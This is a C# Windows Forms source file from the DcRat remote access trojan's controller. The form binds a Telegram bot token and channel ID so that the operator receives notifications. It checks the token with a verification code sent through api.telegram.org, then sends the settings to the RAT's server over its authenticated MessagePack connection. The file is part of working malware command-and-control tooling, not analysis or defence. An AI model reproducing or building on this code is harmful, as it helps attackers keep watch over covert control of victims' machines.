using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using DcRat.Properties;
using DcRat.TCPSocket;
using MessagePack;
using Microsoft.VisualBasic;

namespace DcRat.helpForms
{
    public partial class helperFormTelegram : Form
    {
        public helperFormTelegram()
        {
            InitializeComponent();
            SetTheme();
        }

        #region Theme

        private void SetTheme()
        {
            var darkTheme = Settings.Default.darkTheme;

            var colorSide = darkTheme ? Settings.Default.colorsidedark : Settings.Default.colorside;
            var colorText = darkTheme ? Settings.Default.colortextdark : Settings.Default.colortext;

            BackColor = colorSide;
            ForeColor = colorText;

            paneltop.BackColor = colorSide;
            labelDcRat.BackColor = colorSide;
            labelDcRat.ForeColor = colorText;
            buttonclose.BackColor = colorSide;

            buttonclose.Image = darkTheme ? Resources.close : Resources.close_dark;
            buttonok.ForeColor = colorText;
            buttonok.BackColor = colorSide;

        }

        #endregion

        #region Move
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();
        [DllImport("user32.dll")]
        public static extern bool SendMessage(IntPtr hwnd, int wMsg, int wParam, int lParam);
        public const int WM_SYSCOMMAND = 0x0112;
        public const int SC_MOVE = 0xF010;
        public const int HTCAPTION = 0x0002;
        private void paneltop_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, WM_SYSCOMMAND, SC_MOVE + HTCAPTION, 0);
        }
        private void labelDcRat_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, WM_SYSCOMMAND, SC_MOVE + HTCAPTION, 0);
        }
        #endregion

        private void buttonok_Click(object sender, EventArgs e)
        {
            try
            {
                if (string.IsNullOrEmpty(textBox1.Text) && string.IsNullOrEmpty(textBox2.Text))
                {
                    MsgPack pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "Notify";
                    pack.ForcePathObject("Message").AsString = "Telegram0";
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                }
                int random = new Random().Next(1000, 9999);
                Telegram(random.ToString());
                string Msgbox = Interaction.InputBox("Type in the verification code you receive", "Verification Code", "Code");
                if (Msgbox == random.ToString())
                {
                    MsgPack pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "Notify";
                    pack.ForcePathObject("Message").AsString = "Telegram";
                    pack.ForcePathObject("ApiToken").AsString = textBox1.Text;
                    pack.ForcePathObject("ChannelID").AsString = textBox2.Text;
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                    MessageBox.Show("Binded");
                    Close();
                }
                else
                {
                    MessageBox.Show("Error,Try again!");
                }

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }



        public void Telegram(string content)
        {
            string urlString = @"https://api.telegram.org/bot" + textBox1.Text + @"/sendMessage?chat_id=" + textBox2.Text + "&text=" + content;
            new WebClient().DownloadString(urlString);
        }

        private void buttonclose_Click(object sender, EventArgs e)
        {
            Close();
        }
    }
}
